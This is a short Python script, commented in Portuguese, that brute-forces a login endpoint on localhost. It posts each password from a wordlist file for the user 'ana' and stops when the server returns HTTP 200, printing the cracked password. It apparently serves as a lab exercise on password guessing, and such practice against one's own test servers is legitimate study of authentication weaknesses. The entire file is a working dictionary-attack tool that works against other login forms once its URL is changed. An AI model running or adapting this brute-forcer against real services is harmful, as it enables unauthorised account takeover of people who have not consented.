import requests

# 1. Configurações básicas
url = "http://127.0.0.1:8002/login"
usuario = "ana"
arquivo_senhas = "senhas.txt"

print("Iniciando o teste de login...")

# 2. Abre o arquivo com as senhas
with open(arquivo_senhas, "r") as arquivo:
    for linha in arquivo:
        senha = linha.strip()

        # 3. Monta e envia a requisição para o servidor
        dados = {"usuario": usuario, "senha": senha}
        resposta = requests.post(url, json=dados)

        print("Testando senha:", senha, "-> Status:", resposta.status_code)

        # 4. Verifica se acertou
        if resposta.status_code == 200:
            print("\n>>> SENHA ENCONTRADA COM SUCESSO! <<<")
            print("A senha de", usuario, "é:", senha)
            break

print("Fim do programa.")
